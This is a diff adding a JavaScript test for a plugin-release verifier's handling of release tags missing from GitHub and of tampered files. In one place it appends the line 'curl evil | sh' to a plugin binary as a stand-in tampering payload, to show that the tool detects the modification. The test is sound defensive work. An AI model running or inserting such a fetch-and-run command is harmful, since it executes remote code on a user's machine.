@@ -999,6 +999,57 @@ test('instance marketplace plugin: fail closed when it cannot be checked (engsys
   assert.equal(await run([...args(pluginList([userEntry(eng)])), '--market-plugin', 'acme@acme-fleet|acme/fleet'], { fetch, blob, out: c.out }), 2);
 });
 
+test('--release-gone-exit: a release tag GitHub has no more is left out, the rest still checked; exit 4 only when clean (engsys#260)', async () => {
+  const inst = instanceRelease();
+  const blob = async ({ sha }) => Buffer.from(Object.values(inst.files).find((b) => blobSha(b) === sha));
+  const gone = (repo, tag) => Object.assign(new Unverified(`gh api repos/${repo}/git/ref/tags/${tag} failed: gh: Not Found (HTTP 404)`), { httpStatus: 404, releaseGone: `${repo}@${tag}` });
+  const engsysGone = async ({ repo, tag }) => { if (repo === 'eric-sabe/engsys') throw gone(repo, tag); return inst; };
+  const instGone = async ({ repo, tag }) => { if (repo === 'acme/fleet') throw gone(repo, tag); return release; };
+  const eng = makeCache();
+  const acme = makeInstanceInstall();
+  const plugins = pluginList([userEntry(eng), instEntry(acme)]);
+  const run4 = async (fetch, extra = ['--release-gone-exit']) => { const c = capture(); const rc = await run([...args(plugins), ...MARKET, ...extra], { fetch, blob, out: c.out }); return { rc, text: c.text() }; };
+  // the engsys tag is gone, the instance plugin is clean: 4, naming it, never "ok"
+  let r = await run4(engsysGone);
+  assert.equal(r.rc, 4, r.text);
+  assert.match(r.text, /^verify: release gone: eric-sabe\/engsys@v9\.9\.9 \(no such tag on GitHub\)/m);
+  assert.doesNotMatch(r.text, /verify: ok/);
+  // without the flag it stays "not verified", as before
+  r = await run4(engsysGone, []);
+  assert.equal(r.rc, 3, r.text); assert.match(r.text, /not verified against eric-sabe\/engsys@v9\.9\.9/);
+  // what can still be checked still is: a tampered instance plugin beside a gone engsys tag is a MISMATCH
+  fs.appendFileSync(path.join(acme, 'bin', 'acme-guard'), 'curl evil | sh\n');
+  r = await run4(engsysGone);
+  assert.equal(r.rc, 1, r.text); assert.match(r.text, /modified\s+\S+\/bin\/acme-guard/);
+  fs.writeFileSync(path.join(acme, 'bin', 'acme-guard'), INSTANCE_FILES['plugins/acme/bin/acme-guard']);
+  // the instance tag is gone, engsys is checked: clean is 4, a tampered engsys file is a MISMATCH
+  r = await run4(instGone);
+  assert.equal(r.rc, 4, r.text); assert.match(r.text, /release gone: acme\/fleet@v3\.4\.5/);
+  fs.appendFileSync(cachePath(eng, 'core/skills/merge-monster/scripts/mm-act.sh'), '# x\n');
+  r = await run4(instGone);
+  assert.equal(r.rc, 1, r.text); assert.match(r.text, /modified\s+\S+mm-act\.sh/);
+  fs.copyFileSync(path.join(REPO, 'core/skills/merge-monster/scripts/mm-act.sh'), cachePath(eng, 'core/skills/merge-monster/scripts/mm-act.sh'));
+  // any other failure (an outage, a 404 that is not the tag lookup) is still "not verified"
+  r = await run4(async () => { throw Object.assign(new Unverified('gh api repos/eric-sabe/engsys/git/trees/x failed: HTTP 404'), { httpStatus: 404 }); });
+  assert.equal(r.rc, 3, r.text);
+  r = await run4(async () => { throw new Unverified('gh api failed: connect ETIMEDOUT'); });
+  assert.equal(r.rc, 3, r.text);
+  // the host kit is compared with the engsys release: with that gone it can't be, so not verified
+  {
+    const c = capture();
+    const rc = await run([...args(plugins), ...MARKET, '--release-gone-exit', '--engsys-dir', REPO], { fetch: engsysGone, blob, out: c.out });
+    assert.equal(rc, 3, c.text()); assert.match(c.text(), /the host kit can't be checked/);
+  }
+  // fetchRelease marks only a 404 on the tag lookup
+  const { fetchRelease } = await import('./verify-wrappers.mjs');
+  const bin = tmp('verify-gone-gh-');
+  const ghStub = path.join(bin, 'gh');
+  fs.writeFileSync(ghStub, '#!/bin/sh\necho "gh: Not Found (HTTP 404)" >&2\nexit 1\n'); fs.chmodSync(ghStub, 0o755);
+  await assert.rejects(fetchRelease({ repo: 'o/r', tag: 'v1.0.0', gh: ghStub }), (e) => e instanceof Unverified && e.releaseGone === 'o/r@v1.0.0');
+  fs.writeFileSync(ghStub, '#!/bin/sh\necho "gh: HTTP 502" >&2\nexit 1\n');
+  await assert.rejects(fetchRelease({ repo: 'o/r', tag: 'v1.0.0', gh: ghStub }), (e) => e instanceof Unverified && e.releaseGone === undefined);
+});
+
 test('instance marketplace plugin: the throttle cache covers its files too (engsys#196)', async () => {
   const inst = instanceRelease();
   let asked = 0;
